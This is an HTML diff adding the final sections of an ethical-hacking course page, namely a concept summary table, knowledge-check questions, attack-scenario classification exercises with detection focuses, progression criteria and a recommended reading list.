+              <td>Weaknesses come from design flaws, misconfigurations, outdated systems, and human behavior.</td>
+              <td>Find the weak link that connects access to impact.</td>
+            </tr>
+            <tr>
+              <td><strong>Attack Classes</strong></td>
+              <td>Passive, active, close-in, insider, and distribution attacks describe different ways systems can be targeted.</td>
+              <td>Classify the attack before choosing controls.</td>
+            </tr>
+            <tr>
+              <td><strong>Phased Methodology</strong></td>
+              <td>Adversaries move through denial, change, steal, entry, expand, and stay objectives.</td>
+              <td>Map every phase to detection and response.</td>
+            </tr>
+            <tr>
+              <td><strong>Red Team / Blue Team Link</strong></td>
+              <td>Offensive findings should improve defensive visibility, hardening, and response.</td>
+              <td>Your test should produce measurable security gains.</td>
+            </tr>
+            <tr>
+              <td><strong>Persistence &amp; Evasion</strong></td>
+              <td>Successful attackers focus on maintaining access and avoiding detection after compromise.</td>
+              <td>Monitor scheduled tasks, startup items, SSH keys, registry changes, process behavior, and encrypted tunnels.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- ASSESSMENT & NEXT STEPS                                       -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="assessment-next-steps">
+      <h2>8. Assessment &amp; Next Steps</h2>
+      <p>
+        Before you move into hands-on hacking methodology, use the checks below to validate that you are thinking like an adversary, not just memorizing definitions. If you cannot answer these from the attacker's perspective, review the relevant section before proceeding.
+      </p>
+
+      <h3>Knowledge Check</h3>
+      <ol>
+        <li>What are the five elements of the CIAAN model, and how does each become an attacker objective?</li>
+        <li>What is the difference between a tactic, a technique, and a procedure (TTP)?</li>
+        <li>What are the five IATF attack classifications, and can you distinguish Passive vs. Active vs. Insider behavior from logs alone?</li>
+        <li>What are Libicki's seven categories of Information Warfare?</li>
+        <li>Why are persistence and evasion considered strategic imperatives, not post-exploitation afterthoughts?</li>
+      </ol>
+
+      <h3>Adversary Lens Self-Check</h3>
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Adversary lens self-check">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Scenario</th>
+              <th>What You Should See From the Attacker's View</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>1</td>
+              <td>An attacker encrypts a company's file shares and demands payment for the decryption key.</td>
+              <td><strong>Availability violation</strong> (ransomware/denial). The attacker is weaponizing the confidentiality control (encryption) to destroy availability. <em>Detection focus:</em> monitor for mass file-extension changes and abnormal entropy spikes.</td>
+            </tr>
+            <tr>
+              <td>2</td>
+              <td>A threat actor plants a hardware implant in a server before it ships from the manufacturer.</td>
+              <td><strong>Distribution attack</strong> (IATF). The trust chain is compromised before the device is ever powered on. <em>Detection focus:</em> supply-chain integrity verification and hardware attestation.</td>
+            </tr>
+            <tr>
+              <td>3</td>
+              <td>An insider copies customer databases to a personal cloud storage account during their notice period.</td>
+              <td><strong>Insider + Confidentiality breach</strong>. Legitimate access is abused for unauthorized exfiltration. <em>Detection focus:</em> data-loss prevention (DLP), egress monitoring, and anomalous off-hours access.</td>
+            </tr>
+            <tr>
+              <td>4</td>
+              <td>A red team operator brute-forces a legacy VPN gateway using known leaked credentials, then elevates to domain admin.</td>
+              <td><strong>Entry → Expand vector</strong>. Authentication bypass (Entry) leads to authorization escalation (Expand). <em>Detection focus:</em> impossible-travel alerts, MFA enforcement, and privileged group monitoring.</td>
+            </tr>
+            <tr>
+              <td>5</td>
+              <td>A nation-state group modifies satellite firmware to disrupt military communications during a conflict.</td>
+              <td><strong>InfoWar / Command and Control (C2) warfare</strong>. This is strategic, not criminal. <em>Detection focus:</em> firmware signing validation, secure boot attestation, and supply-chain anomaly detection.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Concept-to-Control Mapping Exercise</h3>
+      <p>
+        For each CIAAN element below, write <strong>one attacker action</strong> that violates it and <strong>one defensive control
+		</strong> that prevents that action. Do this mentally or in your lab notebook. Do not copy the lesson text — phrase it as 
+		an attacker would.
+      </p>
+      <ul>
+        <li><strong>Confidentiality</strong> → Attacker action? Control?</li>
+        <li><strong>Integrity</strong> → Attacker action? Control?</li>
+        <li><strong>Availability</strong> → Attacker action? Control?</li>
+        <li><strong>Authenticity</strong> → Attacker action? Control?</li>
+        <li><strong>Non-repudiation</strong> → Attacker action? Control?</li>
+      </ul>
+
+      <h3>Gateway Criteria for Module 03</h3>
+      <p>You are cleared to proceed when you can:</p>
+      <ol>
+        <li>Recite the <strong>Attack Formula</strong> (<code>Attack = Motive + Method + Vulnerability</code>) and apply it to a real breach in the news.</li>
+        <li>Confirm you understand why <strong>persistence and evasion</strong> are strategic, not technical afterthoughts.</li>
+        <li>Review the <strong>IATF attack classes</strong> and be able to distinguish Passive vs. Active vs. Insider behavior from logs alone.</li>
+        <li>Map any tactical action to its correct <strong>phase</strong> in the adversary pathway (Denial, Change, Steal, Entry, Expand, Stay).</li>
+        <li>Articulate the difference between <strong>vertical</strong> and <strong>horizontal</strong> privilege escalation with a real tool example for each.</li>
+      </ol>
+
+      <h3>Recommended Reading</h3>
+      <ul>
+        <li><a href="https://attack.mitre.org" target="_blank" rel="noopener">MITRE ATT&amp;CK Framework</a>: Adversary TTPs and detection opportunities.</li>
+        <li><a href="https://www.nist.gov/cyberframework" target="_blank" rel="noopener">NIST Cybersecurity Framework</a>: Core controls, implementation tiers, and risk management guidance.</li>
+        <li><a href="https://www.cve.org" target="_blank" rel="noopener">CVE (Common Vulnerabilities and Exposures)</a>: Public vulnerability database.</li>
+        <li><a href="https://gtfobins.github.io" target="_blank" rel="noopener">GTFOBins</a>: Unix binaries that can be used to bypass local security restrictions.</li>
+        <li><a href="https://www.rand.org/pubs/monograph_reports/MR964.html" target="_blank" rel="noopener">Libicki, M.C., <em>What Is Information Warfare?</em> (1995)</a>: Foundational text on InfoWar categories.</li>
+      </ul>
+
+      <div class="info-remember" style="margin: 15px 0;">
+        <em>RedOps-Reminder:</em> Before you touch a tool, map the CIAAN elements, attacker motives, TTPs, and attack classes. The threat 
+		model makes your actions intelligent, not the command you type.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- FLOATING NAVIGATION                                           -->
+<!-- ============================================================ -->
+
+    <div class="lesson-nav-container">
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/1-introduction-to-ethical-hacking/01-introduction" class="nav-link-btn">👈 Back</a>
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/1-introduction-to-ethical-hacking/03-hacking-concepts" class="nav-link-btn">Next 👉</a>
+    </div>
+	</article>
+  </main>
+</body>
+</html>
